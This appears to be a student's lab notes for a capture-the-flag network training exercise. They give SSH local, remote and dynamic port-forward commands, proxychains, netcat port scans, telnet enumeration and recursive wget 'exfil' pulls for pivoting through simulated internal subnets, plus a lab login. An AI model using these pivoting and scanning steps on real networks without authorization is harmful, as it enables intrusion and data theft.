@@ -1,0 +1,182 @@
+Target T3 appears to have access to the 10.3.0.0/26 subnet.
+    Create a Local Port Forward from Ops Station to T3 targeting:
+ip: 10.3.0.27
+port: http
+Identify the flag on Victoria's HTTP Server
+
+Task 2 Tunnel Training
+Utilize the targets T3, and T4 to develop ssh tunneling capabilities for use by Gorgan Cyber Forces:
+
+T3 is your designated initial Pivot from your Analyst Ops station
+When creating tunnels your authorized port ranges to utilize are 3XX00 - 3XX99 (XX = Student Number - ie 01 for student1)
+
+e.g. :
+student 1, port forward 1 = 30101
+student 1, port forward 2 = 30102
+student 1, port forward 3 = 30103
+student 12, port forward 1 = 31201
+student 12, port forward 12 = 31212
+
+  1  Create valid ssh Local Port Forward to leverage for follow-on actions
+
+  2  Create valid ssh Remote Port Forward to leverage for follow-on actions
+
+  3  Create valid ssh Dynamic Port Forward to leverage for follow-on actions
+
+Task 3 Data Collection
+You are tasked to provide support for Gorgan Cyber Forces operating within Donovian Cyberspace. Utilizing all capabilities and skills developed, interact with the provided target T5 entry point and enumerate their network and systems.
+
+T3
+Hostname: Atropia
+IP: 10.50.20.96 (Initial pivot)
+creds: net20008_student15:password15 (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
+Known Ports: 22(ssh)
+Action: Establish appropriate tunneling techniques
+
+T4
+Hostname: Pineland
+IP: 10.50.21.221 (Will be Provided by Mission Command)
+creds: netY_studentX:passwordX (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
+Known Ports: 23(telnet)
+Type: Compromised Donovian System
+Action: Establish appropriate tunneling techniques
+
+==========================================================
+<---Create a Local Port Forward from Ops Station to T3 targeting--->
+Step 1: #setting up a tunnel to T3 ssh port
+ssh net1_student15@10.50.20.96 -L 31500:localhost:22 -NT
+
+Step 2:	#set up a dynamic port traversing through the first tunnel
+ssh net1_student15@localhost -p 31500 -D 9050 -NT
+
+Step 3:	retrieve http data that looks like it came from T3
+proxychains curl 10.3.0.27
+---------------------------------------------------------------
+<---Create a Dynamic Port Forward from Ops Station to T3 targeting--->
+Step 1: #setting up a tunnel to T3 ssh port
+ssh net1_student15@10.50.20.96 -L 31500:localhost:22 -NT
+
+Step 2:	#set up a dynamic port traversing through the first tunnel
+ssh net1_student15@localhost -p 31500 -D 9050 -NT
+
+Step 3:	to retieve ftp data that looks like it came from T3
+proxychains wget -r ftp://10.3.0.1
+---------------------------------------------------------------
+<---Leverage this internal access to act as an insider threat throughout this Grorgan Cyber Training Operation. Enumerate this host and determine where the shared location for data relating to CCTC is on the machine.--->
+Step 1:
+telnet 10.50.21.221
+
+Step 2:
+find / -iname "cctc" 2>/dev/null
+
+Note: /usr/share/cctc was the dir that the hint and flag was in
+---------------------------------------------------------------
+<---Create a Remote Port Forward from T4 to T3 binding && Create a Local Port Forward from Ops Station to T3 targeting the port you just established--->
+Step 1: #setting up a local port forward to T3(Atropia)  from Ops Station
+ssh net1_student15@10.50.20.96 -L 31500:localhost:22 -NT
+
+Step 2: #set up a remote port forward from T4(Pineland insider threat) to T3
+telnet 10.50.21.221
+ssh net1_student15@10.3.0.10 -R 31501:localhost:22 -NT	#from T4 opening 31501 on T3
+
+Step 3: #set up tunnel to from ops to T4 going through T3
+ssh net1_student15@10.50.20.96 -L 31502:localhost:31501 -NT
+
+Step 4: #set up dynamic port that sits on T4		#it moves around by changing the port num after -p
+ssh net1_student15@localhost -p 31502 -D 9050 -NT
+
+Step 5:	#scan/exfill data from hosts that T4 can see
+proxychains wget -r ftp://10.2.0.2
+-and-
+proxychains curl 10.2.0.2
+
+#tunnel to atlantica from OPS through T4
+ssh net1_student15@localhost -p 31502 -L 31503:10.2.0.3:22 -NT
+
+#tunnel to baja-republic from OPS through T3	(found via hint intel on atlantica)
+ssh net1_student15@localhost -p 31500 -L 31504:10.4.0.1:22 -NT
+
+#with proxychains running through baja, scan the 10.5.0.0/24 looking for one port at a time
+
+##scans a single ip and prints open ports
+proxychains nc -nzvw1 10.2.0.200 1-1024 2>&1 | grep -E 'open'
+
+##view listening ports
+netstat -tulpn
+
+##best scanners are:
+scanner.sh	&	scan.sh
+---------------------------------------------------------------------
+<----------Task 3 Data Collection---------->
+Step 1:		#Scan given IP
+nc -nzvw1 10.50.20.200 20 21 22 23 80 443 2>&1 | grep -E 'open'
+
+Step 2: 	#Telnet into box (23 was open) and enumerate
+ip addr
+arp -a
+ip route
+netstat -tulpn
+
+Step 3:		#set up remote port forward from T5 to OPS station
+ssh robert.ruedlinger@10.50.32.138 -R 31500:localhost:22 -NT
+
+Step 4:		#create dynamic port that sits on T5 and wget T5 port 80
+ssh net1_student15@localhost -p 31500 -D 9050 -NT
+proxychains wget -r localhost -p 31500
+#cd into dir created
+pcmanfm
+#select flag.png
+
+Step 5: 	#scan T5 network for hosts
+proxychains ./ncScan.sh 192.168.0 | grep -E 'OK$|open$|succ'
+
+#enumerate each host
+proxychains wget -r 192.168.0.20	#had a hint (ssh on RHP)
+proxychains wget -r 192.168.0.30	#had a hint (ssh on RHP)
+proxychains wget -r 192.168.0.40	#had a flag and hint
+
+Step 6:		#find what alt port ssh is being hosted on
+proxychains nc -nzvw1 192.168.0.20 1024-65535 2>&1 | grep -E 'open'
+#run for the .30 and .40 as well 
+#check it with banner grab
+proxychains telnet 192.168.0.20 3333
+-or-
+nc 192.168.0.20 3333
+
+Step 7:		#establish tunnels to hosts pivoting off T5
+#to .20
+ssh net1_student15@localhost -p 31500 -L 31501:192.168.0.20:3333 -NT
+#to .40
+ssh net1_student15@localhost -p 31500 -L 31503:192.168.0.40:5555 -NT
+
+Step 8:
+#move dynamic port to .20 and enumerate
+
+Step 9: 	#establish a tunnel through T5 --> .40 --> targeting .60(telnet)
+ssh net1_student15@localhost -p 31502 -L 31503:172.16.0.60:23 -NT
+
+Step 10:	#create remote port forward from .60 to .40
+ssh net1_student15@192.168.0.40 -p 5555 -R 31555:localhost:22 -NT
+
+Step 11:	#extend port forward from .40 (connecting to .60 ssh) to OPS
+ssh net1_student15@localhost -p 31502 -L 31504:localhost:31555 -NT
+
+Step 12:
+#move dynamic port to .60 and enumerate hosts
+
+Step 13::	#create tunnel to target .90 alt ssh port
+ssh net1_student15@localhost -p 31504 -L 31505:172.16.0.90:2222 -NT
+
+Step 14:	#create tunnel to .100 via telnet
+ssh net1_student15@localhost -p 31505 -L 31506:172.16.0.100:23 -NT
+
+Step 15:
+tcpdump not port 23 -XX
+
+
+
+
+
+
+
+
